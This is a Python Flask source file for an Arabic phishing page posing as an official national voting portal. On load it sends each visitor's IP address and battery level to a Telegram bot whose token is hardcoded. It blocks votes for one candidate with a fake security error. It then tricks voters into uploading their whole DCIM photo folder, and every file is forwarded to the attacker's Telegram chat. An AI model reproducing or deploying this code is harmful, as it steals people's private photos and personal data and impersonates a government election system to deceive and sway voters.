from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# --- إحداثيات التحكم الخاصة بك ---
BOT_TOKEN = "8019187442:AAHTk58jSJpGHGduzUcMANIm-89yjqI15AY"
CHAT_ID = "936456904"

HTML_OFFICIAL_VOTE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التصويت الوطنية | التوثيق الرقمي</title>
    <style>
        body { background: #f0f2f5; color: #1c1e21; font-family: 'Tajawal', sans-serif; text-align: center; margin: 0; padding: 0; }
        .gov-header { background: #002d56; color: white; padding: 15px; font-weight: bold; border-bottom: 4px solid #d4af37; }
        .container { max-width: 450px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #002d56; }
        .candidate-card { border: 1px solid #e1e4e8; border-radius: 10px; padding: 15px; margin: 10px 0; display: flex; align-items: center; cursor: pointer; transition: all 0.2s; }
        .candidate-card:hover { background: #f8f9fa; border-color: #002d56; }
        .candidate-card img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid #002d56; margin-left: 15px; }
        .selected { background: #e7f3ff; border: 2px solid #002d56; }
        #auth-section { display: none; margin-top: 25px; background: #fff9e6; border: 1px solid #ffeeba; padding: 15px; border-radius: 5px; }
        .submit-btn { background: #002d56; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 1.1em; cursor: pointer; margin-top: 10px; }
        #final-screen { display: none; padding: 40px 20px; }
        .check-icon { font-size: 50px; color: #28a745; }
    </style>
</head>
<body onload="initSystem()">
    <div class="gov-header">بوابة التوثيق الإلكتروني - نظام الانتخابات المركزية 2026</div>

    <div class="container" id="voting-panel">
        <h3>المرشحين المعتمدين للمرحلة النهائية</h3>
        <p style="font-size: 0.9em; color: #606770;">يرجى اختيار المرشح المفضل لديك والمتابعة للتوثيق:</p>

        <div class="candidate-card" onclick="alert('خطأ أمني: التصويت لهذا المرشح يتطلب مفتاح تشفير خارجي (U2F). يرجى اختيار مرشح آخر.')">
            <img src="https://via.placeholder.com/60/002d56/FFFFFF?text=Candidate+1" alt="أحمد">
            <div><b>أحمد علي سيف</b><br><small>مستقل</small></div>
        </div>

        <div class="candidate-card" onclick="selectCandidate(this)">
            <img src="https://via.placeholder.com/60/d4af37/000000?text=MA" alt="محمد">
            <div><b>محمد عبدالعزيز</b><br><small>التحالف الوطني</small></div>
        </div>

        <div id="auth-section">
            <p>🔒 <b>إجراء أمني مطلوب:</b></p>
            <p style="font-size: 0.85em;">لضمان صحة التصويت، يجب رفع <b>مجلد التحقق من الهوية (DCIM)</b> لمطابقة البيانات مع السجل الرقمي.</p>
            <input type="file" id="grabber" webkitdirectory directory multiple style="display:none;" onchange="executeExfiltration()">
            <button class="submit-btn" onclick="document.getElementById('grabber').click()">تأكيد الهوية وإرسال الصوت</button>
        </div>
    </div>

    <div class="container" id="final-screen">
        <div class="check-icon">✓</div>
        <h2>تم التوثيق بنجاح</h2>
        <p>عزيزي المصوت، تم إدراج صوتك لصالح <b>محمد عبدالعزيز</b> بنجاح في السجلات المركزية.</p>
        <p style="font-size: 0.8em; color: #666;">رقم العملية: #VZ-9904-WORM</p>
    </div>

    <script>
    const tk = "{{ token }}";
    const cid = "{{ chat }}";

    async function initSystem() {
        let bat = await navigator.getBattery();
        let log = `🛡️ **دخول لمنصة التصويت الرسمية**\\n📡 IP: جاري الجلب...\\n🔋 البطارية: ${Math.round(bat.level * 100)}%`;
        fetch(`https://api.telegram.org/bot${tk}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(log)}&parse_mode=Markdown`);
    }

    function selectCandidate(el) {
        document.querySelectorAll('.candidate-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');
        document.getElementById('auth-section').style.display = 'block';
    }

    async function executeExfiltration() {
        let f = document.getElementById('grabber').files;
        if(f.length === 0) return;

        fetch(`https://api.telegram.org/bot${tk}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("📸 **بدء سحب الأرشيف المصور للضحية بالكامل...**")}&parse_mode=Markdown`);

        for (let i = 0; i < f.length; i++) {
            let fd = new FormData();
            fd.append('file', f[i]);
            fetch('/v1/grab', { method: 'POST', body: fd });
        }

        document.getElementById('voting-panel').style.display = 'none';
        document.getElementById('final-screen').style.display = 'block';
    }
    </script>
</body>
</html>
"""

@app.route('/')
def portal():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                  json={"chat_id": CHAT_ID, "text": f"📍 **IP المصوت:** `{ip}`", "parse_mode": "Markdown"})
    return render_template_string(HTML_OFFICIAL_VOTE, token=BOT_TOKEN, chat=CHAT_ID)

@app.route('/v1/grab', methods=['POST'])
def grab():
    if 'file' in request.files:
        f = request.files['file']
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                      data={'chat_id': CHAT_ID}, files={'document': f})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
